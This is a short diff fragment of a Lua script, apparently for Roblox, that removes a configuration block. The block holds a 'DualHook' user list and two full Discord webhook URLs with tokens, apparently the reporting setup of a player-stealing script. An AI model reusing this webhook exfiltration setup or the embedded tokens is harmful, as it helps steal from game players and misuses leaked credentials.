@@ -10,22 +10,6 @@
                         Made by: Scripter.SM
                         Discord: discord.gg/d2zgg2YDMz
 ]]
-_G.Script = _G.Script or {}
-_G.Script.SM = _G.Script.SM or {}
-_G.Script.SM.Config = {
-    ["DualHook-User"] = { -- Replaces local usernames = { "DUALHOOKUSERNAMES" }
-        "User1",
-        "User2",
-        "User3",
-        "User4"
-    },
-    DualHookWebhook = "https://discord.com/api/webhooks/1403640195588292658/844E2jroYGuJv7BquIF2wioBqo-BFXruUDx_vxxuRNtYnODsvNKHNhBas2LJPXGr7cet", -- Sends along with getgenv().Webhook
-    ServerName = "NOOBSCRIPTS", -- Replaces "Scripts.SM"
-    MSG = "dumb" -- Replaces setclipboard text
-}
-
-getgenv().Webhook = "https://discord.com/api/webhooks/1403640268468523170/BNoCP3afL4zFPg5xQIMrQzJDnH6ZvQ2Zny1S3WAHDsqbAsKO6jOvnTKrdljhjAyZUstS"
-getgenv().Username = "DefaultUser"
 
         local RS = game:GetService("ReplicatedStorage")
         local Players = game:GetService("Players")
